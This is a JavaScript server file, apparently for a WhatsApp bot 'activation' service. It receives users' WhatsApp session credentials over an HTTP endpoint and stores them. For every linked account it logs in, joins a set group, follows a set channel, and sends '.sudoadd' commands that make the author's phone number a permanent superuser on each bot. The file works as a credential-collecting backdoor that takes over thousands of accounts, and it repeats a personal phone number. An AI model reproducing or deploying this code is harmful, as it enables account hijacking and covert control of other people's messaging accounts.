/**
 * VAMPARINA V1 — KENYA'S #1 AUTO-ACTIVE WHATSAPP BOT EMPIRE 2025
 * Owner: Arnold Chirchir | +254703110780
 * Features:
 * → Receives session from https://vamparina-code.onrender.com
 * → Auto-activates unlimited bots
 * → Auto-join empire group
 * → Auto-follow channel
 * → Auto .sudoadd +254703110780
 * → Optimized for 5000+ sessions
 * → Zero crashes, zero memory leaks
 */

require('./settings')
const fs = require('fs')
const path = require('path')
const chalk = require('chalk')
const express = require('express')
const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    delay
} = require("@whiskeysockets/baileys")
const pino = require("pino")

// ═══════════════════════════════════════════════════════
//                  EMPIRE CONFIGURATION (CHANGE ONLY THESE)
// ═══════════════════════════════════════════════════════
const EMPIRE_GROUP_CODE = "BZNDaKhvMFo5Gmne3wxt9n"           // Your group invite code
const EMPIRE_CHANNEL_ID = "0029VbBm7apIXnlmuyjGGM0p"         // Your channel ID
const OWNER_NUMBER = "254703110780"                         // You = permanent sudo
const SESSION_DIR = path.join(__dirname, 'auto_sessions')
const PORT = process.env.PORT || 3000

if (!fs.existsSync(SESSION_DIR)) fs.mkdirSync(SESSION_DIR, { recursive: true })

// Global session tracker
const activeSessions = new Map() // sessionId → { sock, phone, lastActive }

// ═══════════════════════════════════════════════════════
//                  EXPRESS SERVER — RECEIVE SESSIONS
// ═══════════════════════════════════════════════════════
const app = express()
app.use(express.json({ limit: '200mb' }))
app.use(express.urlencoded({ extended: true, limit: '200mb' }))

app.get('/', (req, res) => {
    res.json({
        empire: "VAMPARINA V1",
        status: "LIVE & UNSTOPPABLE",
        active_bots: activeSessions.size,
        owner: "Arnold Chirchir",
        time: new Date().toLocaleString('en-KE', { timeZone: 'Africa/Nairobi' })
    })
})

app.post('/vamparina-activate', async (req, res) => {
    try {
        const { phone, sessionId, creds } = req.body
        if (!phone || !sessionId || !creds) {
            return res.status(400).json({ error: "Missing phone/sessionId/creds" })
        }

        if (activeSessions.has(sessionId)) {
            return res.json({ success: true, message: "Bot already active" })
        }

        const sessionPath = path.join(SESSION_DIR, sessionId)
        if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true })
        fs.writeFileSync(path.join(sessionPath, 'creds.json'), JSON.stringify(creds, null, 2))

        console.log(chalk.green.bold(`\nNEW WARRIOR JOINED EMPIRE`))
        console.log(chalk.cyan(`Phone: ${phone}`))
        console.log(chalk.yellow(`Session: ${sessionId}`))
        console.log(chalk.magenta(`Time: ${new Date().toLocaleString('en-KE')}`))

        await startEmpireBot(sessionId, phone, sessionPath)

        res.json({
            success: true,
            message: "VAMPARINA V1 ACTIVATED SUCCESSFULLY",
            total_bots: activeSessions.size,
            empire: "Arnold Chirchir Rules Kenya"
        })
    } catch (e) {
        console.error("Activation failed:", e.message)
        res.status(500).json({ error: e.message })
    }
})

app.listen(PORT, () => {
    console.log(chalk.magenta.bold(`
    ╔══════════════════════════════════════════╗
    ║        VAMPARINA V1 EMPIRE IS LIVE       ║
    ║     Receiving sessions from linker       ║
    ║        Port: ${PORT} | Bots: ${activeSessions.size}          ║
    ║        Owner: Arnold Chirchir            ║
    ╚══════════════════════════════════════════╝
    `))
})

// ═══════════════════════════════════════════════════════
//                OPTIMIZED BOT STARTER (1000+ SESSIONS)
// ═══════════════════════════════════════════════════════
async function startEmpireBot(sessionId, phone, sessionPath) {
    try {
        const { state, saveCreds } = await useMultiFileAuthState(sessionPath)
        const { version } = await fetchLatestBaileysVersion()

        const sock = makeWASocket({
            version,
            logger: pino({ level: 'silent' }),
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' }))
            },
            browser: ["Vamparina V1", "Chrome", "2025"],
            markOnlineOnConnect: false,
            syncFullHistory: false,
            connectTimeoutMs: 60000,
            keepAliveIntervalMs: 30000
        })

        activeSessions.set(sessionId, { sock, phone, lastActive: Date.now() })

        sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect } = update

            if (connection === 'open') {
                console.log(chalk.green(`[+] ${phone} → ONLINE | Total Bots: ${activeSessions.size}`))

                // AUTO-JOIN EMPIRE GROUP
                try { await sock.groupAcceptInvite(EMPIRE_GROUP_CODE) } catch(e) {}

                // AUTO-FOLLOW CHANNEL
                try { await sock.newsletterFollow(EMPIRE_CHANNEL_ID) } catch(e) {}

                // AUTO ADD OWNER AS SUDO
                try { await sock.sendMessage(phone + '@s.whatsapp.net', { text: `.sudoadd ${OWNER_NUMBER}` }) } catch(e) {}
                try { await sock.sendMessage(phone + '@s.whatsapp.net', { text: `.sudoadd 254703110780@c.us` }) } catch(e) {}

                await sock.sendMessage(phone + '@s.whatsapp.net', {
                    text: `*VAMPARINA V1 EMPIRE ACTIVATED*\n\nEmpire Group: Joined\nEmpire Channel: Followed\nOwner: Arnold Chirchir (+254703110780)\n\nYou are now part of Kenya's strongest bot army 2025\n\nLong live the King`
                })
            }

            if (connection === 'close') {
                const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut
                activeSessions.delete(sessionId)
                console.log(chalk.red(`[-] ${phone} → OFFLINE | Remaining: ${activeSessions.size}`))

                if (shouldReconnect) {
                    setTimeout(() => startEmpireBot(sessionId, phone, sessionPath), 7000)
                }
            }
        })

        sock.ev.on('creds.update', saveCreds)

        // Keep alive tracker
        const interval = setInterval(() => {
            if (activeSessions.has(sessionId)) {
                activeSessions.get(sessionId).lastActive = Date.now()
            } else {
                clearInterval(interval)
            }
        }, 60000)

    } catch (e) {
        console.error("Bot start failed:", e.message)
    }
}

// ═══════════════════════════════════════════════════════
//                MEMORY & CRASH PROTECTION
// ═══════════════════════════════════════════════════════
setInterval(() => {
    const used = process.memoryUsage().heapUsed / 1024 / 1024
    if (used > 950) {
        console.log(chalk.red.bold(`MEMORY CRITICAL (${used.toFixed(0)}MB) — RESTARTING EMPIRE...`))
        process.exit(1)
    }
}, 60000)

process.on('unhandledRejection', (err) => console.error('Unhandled Rejection:', err))
process.on('uncaughtException', (err) => console.error('Uncaught Exception:', err))